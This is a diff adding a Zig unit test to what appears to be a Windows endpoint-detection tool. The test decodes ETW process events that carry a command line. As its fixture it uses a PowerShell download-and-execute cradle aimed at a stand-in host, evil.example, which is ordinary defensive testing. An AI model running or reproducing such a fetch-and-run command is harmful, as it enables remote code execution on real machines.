@@ -1204,3 +1204,40 @@ test "TDH TLV payload decodes bounded host properties" {
     try std.testing.expectEqualStrings("cmd.exe", rec.imagePath());
     try std.testing.expectEqual(@as(u32, 1234), rec.parent_process_id);
 }
+
+test "RULE-COVERAGE-001: ETW CommandLine TLV decodes when the provider supplies it" {
+    // Fixture mirrors AEGIS_ETW_TLV_IMAGE=1 / AEGIS_ETW_TLV_CMDLINE=2 built by
+    // etw_native.c:decode_tdh_properties. This proves the Zig consumer's path;
+    // it does NOT claim this host emits kind 2 (see FN-1 / PROCESS-CMDLINE-001).
+    const img = "powershell.exe";
+    const cl = "powershell -c IEX (New-Object Net.WebClient).DownloadString('https://evil.example/p.ps1')";
+    var payload: [256]u8 = [_]u8{0} ** 256;
+    payload[0] = 0x41;
+    payload[1] = 0x45;
+    payload[2] = 0x47;
+    payload[3] = 0x54; // "AEGT"
+    var off: usize = 4;
+    std.mem.writeInt(u16, payload[off..][0..2], 1, .little);
+    std.mem.writeInt(u16, payload[off + 2 ..][0..2], @intCast(img.len), .little);
+    off += 4;
+    @memcpy(payload[off .. off + img.len], img);
+    off += img.len;
+    std.mem.writeInt(u16, payload[off..][0..2], 2, .little);
+    std.mem.writeInt(u16, payload[off + 2 ..][0..2], @intCast(cl.len), .little);
+    off += 4;
+    @memcpy(payload[off .. off + cl.len], cl);
+    off += cl.len;
+
+    var with_cmdline = EtwEventRecord{};
+    decodeTdhPayload(&with_cmdline, payload[0..off]);
+    try std.testing.expectEqualStrings(img, with_cmdline.imagePath());
+    try std.testing.expectEqualStrings(cl, with_cmdline.commandLine());
+
+    // FN-1 negative control: this host's ProcessStart v0..v4 carry ImageName
+    // only. With no kind-2 TLV the field stays empty -- never a fabricated
+    // command line, so R2003 cannot be claimed as positively proven here.
+    var host_shape = EtwEventRecord{};
+    decodeTdhPayload(&host_shape, payload[0 .. 4 + 4 + img.len]);
+    try std.testing.expectEqualStrings(img, host_shape.imagePath());
+    try std.testing.expectEqualStrings("", host_shape.commandLine());
+}
